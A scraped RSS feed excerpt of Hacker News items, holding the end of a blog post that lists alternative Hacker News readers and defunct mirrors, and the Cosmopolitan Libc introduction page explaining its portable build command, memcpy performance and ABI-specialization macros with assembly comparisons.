<p><a href="http://n-gate.com/%3En-gate.com%3C/a%3E%3Cbr%20/%3EA%20weekly%20[human?]%20annotated%20digest%20of%20the%20top%20%E2%80%9CHacker%E2%80%9D%20%E2%80%9CNews%E2%80%9D%20posts%3Cbr%20/%3EAlexa:%202.5m%3C/p%3E%3Cp%3E%3Ca%20href=" https:="" hn.premii.com"="">hn.premii.com</a><br>
HN Mirror integrated with an on-page reader<br>
Alexa: 3m</p>
<p><a href="http://hnrankings.info/">hnrankings.info</a><br>
HN Ranking Charts<br>
Alexa: 4m</p>
<p><a href="https://hnews.xyz/">hnews.xyz</a><br>
HN Mirror with Webpage Screenshots [similar to tiledhn.com (<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">RIP</a>)]<br>
Alexa: 5m</p>
<p><a href="https://hnsince.com/">hnsince.com</a><br>
Top HN posts since you last visited<br>
Alexa: 5.4m</p>
<p><a href="https://hackerweb.app/">hackerweb.app</a><br>
More mobile-friendly HN<br>
Alexa: 6.3m</p>
<p><a href="https://fullhn.com/">fullhn.com</a><br>
Front page of HN in a single page loaded with all articles. Great for loading up before you jump on a flight without wireless access.<br>
Alexa: 7m</p>
<p><a href="https://hackurls.com/">hackurls.com</a><br>
HN, proggit, reddit, toptal, hackaday, slashdot, techmeme, wired as separate feeds on a single page<br>
Alexa: 8.5m</p>
<p><a href="https://hackernewsmobile.com/">hackernewsmobile.com</a><br>
More mobile-friendly HN<br>
Alexa: 9.5m</p>
<p><a href="https://lopespm.github.io/hackernews-daily/">lopespm HN Daily</a><br>
HackerNews Daily – Culmination of top posts for the day<br>
Alexa: Unavailable</p>
<p><a href="https://www.wolfgangfaust.com/project/paper-hn/">wolfgangfaust HN Newspaper</a><br>
Newspaper themed HN<br>
Alexa: Unavailable</p>
<p><a href="https://thn.rakhim.org/">thn.rakhim.org</a><br>
30 random good HN posts from the past<br>
Alexa: Unavailable</p>
<p><a href="https://zvoid.org/hn">zvoid.org/hn</a><br>
Dark-themed HN reader<br>
Alexa: Unavailable</p>
<p><a href="https://hn.svelte.dev/">hn.svelte.dev</a><br>
mobile and dark mode friendly reader for HN<br>
Alexa: None</p>
<p><a href="https://hackernews.betacat.io/">hackernews.betacat.io</a><br>
Modern HN theme with website preview screenshots<br>
Alexa: None</p>
<p><a href="https://read.hn/">read.hn</a><br>
Another HN Reader view<br>
Alexa: None</p>
<p><a href="https://hnapp.com/">hnapp.com</a><br>
HN Advanced Search and monitoring tool<br>
Alexa: None</p>
<p><a href="http://hnpaper.forge.partlab.io/">hnpaper.forge.partlab.io</a><br>
HNPaper – bootstrap theme simple HN interface<br>
Alexa: Unavailable</p>
<p><a href="https://hack.ernews.info/">hack.ernews.info</a><br>
More mobile-friendly HN<br>
Alexa: None</p>
<p><a href="https://progscrape.com/">progscrape.com</a><br>
HN, Reddit, and Lobste.rs aggregated and merged into a single feed<br>
Alexa: None</p>
<p><a href="http://hn.elijames.org/">hn.elijames.org</a><br>
“Less annoying hacker news” with an even simpler interface<br>
Alexa: None</p>
<p><a href="http://serializer.io/">seralizer.io</a><br>
HN + Related Subreddits + Lobsters + Mac Rumors + Arstechnica<br>
Alexa: None</p>
<p><a href="https://nerdmash.com/">nerdmash.com</a><br>
A nerd’s daily read. Top posts from every nerdy content aggregator.<br>
Alexa: None</p>
<h2>Other Tweaks / Interfaces</h2>
<p><a href="https://old.reddit.com/r/hackernews/">/r/hackernews</a><br>
Subreddit for HN<br>
51,450 readers</p>
<p><a href="https://hnreplies.com/">hnreplies.com</a><br>
Emails on replies to your comments<br>
Alexa: 3.2m</p>
<p><a href="https://apps.apple.com/us/app/id1308885491">Octal iOS App</a><br>
Full-featured HN client with support for posting/voting/comments – iOS only.<br>
4.8/5.0 – 1K Ratings</p>
<p><a href="https://hnrss.github.io/">hnrss.github.io</a><br>
HN RSS Feed<br>
Alexa: None</p>
<p><a href="https://hackerne.ws/">hackerne.ws</a><br>
HN Short Link – redirects to https://news.ycombinator.com<br>
Alexa: None</p>
<p><a href="https://chrome.google.com/webstore/detail/hacker-news-ux/chngbdmhgakoomomnnhfapkpbalpmhid">Hacker News UX</a><br>
Chrome Extension for Improved UI<br>
356 users</p>
<p><a href="https://f5bot.com/">f5bot.com</a><br>
Reddit / HN / Lobsters keyword mention watch tool.<br>
Alexa: 1.1m</p>

<h2>Graveyard</h2>
<p>hackermonthly.com [<a href="https://web.archive.org/web/20160731192600/http://hackermonthly.com/">defunct</a>]<br>
HN in print</p>
<p>quiethn.com [<a href="https://web.archive.org/web/20171001013212/https://quiethn.com/">defunct</a>]<br>
HN with less clutter </p>
<p>hackerblogs.com [<a href="https://web.archive.org/web/20110204021331/http://www.hackerblogs.com/">defunct</a>]<br>
2011-era mobile view</p>
<p>hackernews.im [defunct]<br>
now <a href="https://hackernews.betacat.io/">hackernews.betacat.io</a></p>
<p>tiledhn.com [<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">defunct</a>]<br>
Windows 8-type view for HN</p>
<p>hackerbra.in [<a href="https://web.archive.org/web/20181105131330/http://hackerbra.in/">defunct</a>]<br>
HN with inline top comments </p>
<p>hnwatcher.com [<a href="https://web.archive.org/web/20201125052525/https://www.hnwatcher.com/">defunct</a>]<br>
user/keyword email notification service</p>
<p>hnmobile.herokuapp.com [<a href="https://web.archive.org/web/20180601000346/http://hnmobile.herokuapp.com/">defunct</a>]<br>
HN mobile friendly mirror</p>
<p>hackernewsemail.com [<a href="https://web.archive.org/web/20180826215821/https://hackernewsemail.com/">defunct</a>]<br>
Daily email for posts with minimum set number of points</p>
<p>hacker-newspaper.gilesb.com [<a href="https://web.archive.org/web/20180402131152/https://news.ycombinator.com/">defunct</a>]<br>
HN Mirror</p>
<p>react-hn.appspot.com [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror</p>
<p>hackeroo.co [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror </p>
</div></div>]]>
            </description>
            <link>https://blog.luke.lol/tech/hacker-news-alternatives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556990</guid>
            <pubDate>Mon, 28 Dec 2020 05:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan Libc: build-once run-anywhere C library]]>
            </title>
            <description>
<![CDATA[
Score 589 | Comments 162 (<a href="https://news.ycombinator.com/item?id=25556286">thread link</a>) | @pantalaimon
<br/>
December 27, 2020 | https://justine.lol/cosmopolitan/index.html | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">» jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>
<span>strlcpy</span>:
	<span>push</span>	<span>%rbp</span>
	<span>mov</span>	<span>%rsp</span>,<span>%rbp</span>
	<span>push</span>	<span>%r14</span>
	<span>mov</span>	<span>%rsi</span>,<span>%r14</span>
	<span>push</span>	<span>%r13</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r13</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>push</span>	<span>%r12</span>
	<span>push</span>	<span>%rbx</span>
	<span>mov</span>	<span>%rdx</span>,<span>%rbx</span>
	<span>call</span>	strlen
	<span>mov</span>	<span>%rax</span>,<span>%r12</span>
	<span>test</span>	<span>%rbx</span>,<span>%rbx</span>
	<span>jne</span>	1f
	<span>pop</span>	<span>%rbx</span>
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
1:	<span>cmp</span>	<span>%rbx</span>,<span>%rax</span>
	<span>mov</span>	<span>%r14</span>,<span>%rsi</span>
	<span>mov</span>	<span>%r13</span>,<span>%rdi</span>
	<span>cmovbe</span>	<span>%rax</span>,<span>%rbx</span>
	<span>mov</span>	<span>%rbx</span>,<span>%rdx</span>
	<span>call</span>	memcpy
	<span>movb</span>	$<span>0</span>,0(<span>%r13</span>,<span>%rbx</span>)
	<span>mov</span>	<span>%r12</span>,<span>%rax</span>
	<span>pop</span>	<span>%rbx</span>
	<span>pop</span>	<span>%r12</span>
	<span>pop</span>	<span>%r13</span>
	<span>pop</span>	<span>%r14</span>
	<span>pop</span>	<span>%rbp</span>
	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td><td>
<pre><span>/ compiled with cosmopolitan libc</span>
<span>strlcpy</span>:
	<span>mov</span>	<span>%rdx</span>,<span>%r8</span>
	<span>mov</span>	<span>%rdi</span>,<span>%r9</span>
	<span>mov</span>	<span>%rsi</span>,<span>%rdi</span>
	<span>call</span>	strlen
	<span>test</span>	<span>%r8</span>,<span>%r8</span>
	<span>je</span>	1f
	<span>cmp</span>	<span>%r8</span>,<span>%rax</span>
	<span>lea</span>	<span>-1(%r8)</span>,<span>%rdx</span>
	<span>mov</span>	<span>%r9</span>,<span>%rdi</span>
	<span>cmova</span>	<span>%rax</span>,<span>%rdx</span>
	<span>call</span>	MemCpy
	<span>movb</span>	$<span>0</span>,(<span>%r9</span>,<span>%rdx</span>)
1:	<span>ret</span>
	<span>.endfn</span>	strlcpy,globl
</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

</p>
</div>]]>
            </description>
            <link>https://justine.lol/cosmopolitan/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556286</guid>
            <pubDate>Mon, 28 Dec 2020 02:59:32 GMT</pubDate>
        </item>
    </channel>
</rss>
